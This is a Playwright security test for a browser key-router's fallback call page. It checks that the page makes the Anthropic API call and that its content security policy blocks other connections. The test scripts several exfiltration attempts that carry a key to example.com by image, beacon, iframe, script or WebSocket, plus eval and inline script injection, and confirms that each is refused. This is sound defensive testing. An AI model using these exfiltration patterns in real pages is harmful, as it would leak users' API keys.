// The call page: how the call to a provider is made in a browser that cannot
// hold a worker to a policy of its own.
//
// In Chrome the call is made by a worker (sites/router/call-worker.js), and the
// other tests cover that. Here a router page is made unable to start that
// worker, as it would be in such a browser, and falls back to the hidden page
// it used before (call.js). The page has to be as tightly held as it was.
// Needs `npx wrangler dev --port 8787` running (PORT=<n> for another port).
import { createRequire } from "node:module";
import { launchWithPartitioning, callers, withoutCallWorker } from "./real-browser.mjs";
const { chromium } = createRequire(import.meta.url)("playwright");
const PORT = process.env.PORT || 8787;
const base = (name) => `http://${name}.localhost:${PORT}`;
let failed = 0;
const check = (name, ok, extra = "") => { console.log(`${ok ? "ok  " : "FAIL"} ${name}${extra ? " " + extra : ""}`); if (!ok) failed++; };
const KEY = "sk-test-THIS-KEY-MUST-NOT-LEAK-0123456789";
const browser = await launchWithPartitioning(chromium);

async function start({ worker }) {
  const ctx = await browser.newContext();
  if (!worker) await withoutCallWorker(ctx);
  await ctx.route(/^https:\/\/fonts\.(googleapis|gstatic)\.com\//, (route) => route.abort());
  const calls = [];
  await ctx.route("https://api.anthropic.com/**", (route) => {
    const cors = { "access-control-allow-origin": "*", "access-control-allow-headers": "*" };
    if (route.request().method() === "OPTIONS") return route.fulfill({ status: 204, headers: cors });
    calls.push({ key: route.request().headers()["x-api-key"], from: route.request().frame().url(), parent: route.request().frame().parentFrame()?.url() });
    const sse = (o) => `event: ${o.type}\ndata: ${JSON.stringify(o)}\n\n`;
    route.fulfill({ status: 200, headers: { ...cors, "content-type": "text/event-stream" }, body: sse({ type: "content_block_delta", index: 0, delta: { type: "text_delta", text: "From the call page." } }) + sse({ type: "message_stop" }) });
  });
  const errors = [];
  ctx.on("page", (p) => p.on("pageerror", (e) => errors.push(`${p.url()}: ${e.message}`)));
  const home = await ctx.newPage();
  await home.goto(base("router") + "/");
  await home.click("#add summary");
  await home.fill("#label", "Work key");
  await home.fill("#key", KEY);
  await home.click("#form button");
  await home.waitForSelector("#accounts li[data-id]");
  return { ctx, calls, errors, home };
}

// ------------------------------------------------ a browser with no call worker
{
  const { ctx, calls, errors, home } = await start({ worker: false });
  const site = await ctx.newPage();
  const open = async () => {
    await site.goto(base("planner") + "/a-site-of-its-own");
    await site.evaluate(async (at) => { const { connect } = await import(at + "/router.js"); window.ai = await connect(); document.body.append(Object.assign(document.createElement("button"), { id: "go", textContent: "Choose" })); document.getElementById("go").onclick = () => { window.chose = window.ai.choose(); }; }, base("router"));
  };
  await open();
  const [popup] = await Promise.all([site.waitForEvent("popup"), site.click("#go")]);
  await popup.waitForSelector("#yes");
  await Promise.all([popup.waitForEvent("close"), popup.click("#yes")]);
  await site.evaluate(() => window.chose);
  // Load the site again, so that the router frame and the call page are loaded through the frame's service worker.
  await site.waitForTimeout(1500);
  await open();
  const answer = await site.evaluate(() => window.ai.prompt("hello").text().catch((error) => "error: " + (error.code || error.message)));
  const frame = site.frames().find((f) => f.url() === base("router") + "/frame.html");
  const callPage = site.frames().find((f) => f.url() === base("router") + "/call/anthropic");
  check("with no call worker to be had, the call is made by the call page, inside the router frame", answer === "From the call page." && calls.length === 1 && calls[0].from === base("router") + "/call/anthropic" && calls[0].parent === base("router") + "/frame.html" && calls[0].key === KEY && !!callPage && callPage.parentFrame() === frame, JSON.stringify(calls[0]));
  const made = (await callers(site)).map((c) => c.url()).join();
  check("no call worker was started", made === base("router") + "/call/anthropic", made);

  const tryFetch = (where, address) => where.evaluate((a) => fetch(a, { mode: "no-cors" }).then(() => "allowed", () => "blocked"), address);
  check("the call page cannot connect to any other address at that provider, to another provider, or anywhere else", (await tryFetch(callPage, "https://api.anthropic.com/v1/models")) === "blocked" && (await tryFetch(callPage, "https://api.anthropic.com/")) === "blocked"
    && (await tryFetch(callPage, "https://api.openai.com/v1/models")) === "blocked" && (await tryFetch(callPage, "https://example.com/")) === "blocked" && (await tryFetch(callPage, "/_sites.js")) === "blocked" && calls.length === 1);
  // Things a page could be talked into doing to carry a key out. Each is stopped by its policy.
  const tried = await callPage.evaluate(async () => {
    // The browser reports each thing its policy stops. One attempt at a time, with a pause
    // after it, so that a report is counted against the attempt that caused it.
    const refused = async (work) => {
      const result = await new Promise((resolve) => {
        const heard = (event) => { document.removeEventListener("securitypolicyviolation", heard); resolve(event.effectiveDirective); };
        document.addEventListener("securitypolicyviolation", heard);
        setTimeout(() => { document.removeEventListener("securitypolicyviolation", heard); resolve("allowed"); }, 1500);
        try { work(); } catch { /* the report says why */ }
      });
      await new Promise((resolve) => setTimeout(resolve, 150));
      return result;
    };
    return {
      // Asked for from a timer: code run straight from the test's own tools is let through, as it is from DevTools.
      eval: await refused(() => { setTimeout(() => { try { new Function("return 1")(); window.__evaled = true; } catch { /* the report says why */ } }, 0); }),
      evaled: window.__evaled === true,
      inline: await refused(() => { const script = document.createElement("script"); script.textContent = "window.__ran = true"; document.head.append(script); }),
      ran: window.__ran === true,
      image: await refused(() => { new Image().src = "https://example.com/pixel.png?key=x"; }),
      style: await refused(() => { const link = document.createElement("link"); link.rel = "stylesheet"; link.href = "https://fonts.googleapis.com/css2?family=x"; document.head.append(link); }),
      frame: await refused(() => { const frame = document.createElement("iframe"); frame.src = "https://example.com/?key=x"; document.documentElement.append(frame); }),
      script: await refused(() => { const script = document.createElement("script"); script.src = "https://example.com/x.js"; document.head.append(script); }),
      beacon: await refused(() => { navigator.sendBeacon("https://example.com/?key=x", "x"); }),
      socket: await refused(() => { new WebSocket("wss://example.com/"); }),
    };
  });
  check("the call page cannot be made to run other code: no eval, no script written in, no script from elsewhere", /^script-src/.test(tried.eval) && !tried.evaled && /^script-src/.test(tried.inline) && !tried.ran && /^script-src/.test(tried.script), JSON.stringify(tried));
  check("the call page cannot carry a key out in an image, a style sheet, a frame, a beacon or a socket", /^img-src/.test(tried.image) && /^style-src/.test(tried.style) && /^(frame-src|child-src)/.test(tried.frame) && /^connect-src/.test(tried.beacon) && /^connect-src/.test(tried.socket), JSON.stringify(tried));

  // The service worker and the call page. A page's requests for other addresses go straight to the network.
  const controlled = await callPage.evaluate(() => !!navigator.serviceWorker.controller).catch(() => false);
  const seen = await frame.evaluate(() => new Promise((resolve) => { const line = new MessageChannel(); line.port1.onmessage = (e) => resolve(e.data); setTimeout(() => resolve(null), 3000); navigator.serviceWorker.controller.postMessage("seen", [line.port2]); })).catch(() => null);
  check("the call page is under the router's service worker, and its call to the provider was never shown to that worker's code", controlled && !!seen && seen.passedBy === 0, JSON.stringify({ controlled, seen }));
  check("no page threw an error", errors.length === 0, errors.join(" ; "));
  await ctx.close();
}

// ------------------------------------------------ a worker that is not held to its own policy
{
  const { ctx, home } = await start({ worker: true });
  // The router's own page asks for a caller, as it does to test a key. First for a real provider.
  const got = await home.evaluate(async () => {
    const { openCaller } = await import("/caller.js");
    const real = await openCaller("anthropic");
    // Then for a name the router does not have. The worker for it is sent with a policy that is not the one it expects, so it must judge itself unfit.
    const none = await openCaller("nothing");
    return { real: real.kind, none: none.kind };
  });
  check("where the worker is held to the policy it expects, the caller is the worker", got.real === "worker" && home.workers().some((w) => w.url() === base("router") + "/call/anthropic.js"), JSON.stringify(got));
  check("a call worker that finds it is not held to the policy it expects will not take a key: the page is used instead", got.none === "page" && home.frames().some((f) => f.url() === base("router") + "/call/nothing") && !home.workers().some((w) => w.url().endsWith("/call/nothing.js")), JSON.stringify(got));
  await ctx.close();
}

await browser.close();
console.log(failed ? `\n${failed} failed` : "\nall passed");
process.exit(failed ? 1 : 0);
